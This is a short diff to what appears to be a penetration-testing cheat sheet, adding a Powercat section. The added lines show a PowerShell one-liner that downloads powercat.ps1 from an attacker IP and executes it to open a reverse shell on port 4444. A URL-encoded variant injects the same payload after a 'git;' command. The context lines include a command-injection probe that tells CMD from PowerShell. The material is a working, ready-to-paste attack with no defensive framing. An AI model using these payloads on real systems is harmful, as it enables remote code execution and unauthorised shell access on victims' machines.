@@ -12,3 +12,10 @@
 (dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
 urlencode((dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell)
 ```
+###### Powercat
+>Powercat is a PowerShell implementation of Netcat included in Kali
+```
+cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .
+IEX (New-Object System.Net.Webclient).DownloadString("http://192.168.119.3/powercat.ps1");powercat -c 192.168.119.3 -p 4444 -e powershell
+urlencode(git;IEX (New-Object System.Net.Webclient).DownloadString("http://192.168.119.3/powercat.ps1");powercat -c 192.168.119.3 -p 4444 -e powershell)
+```
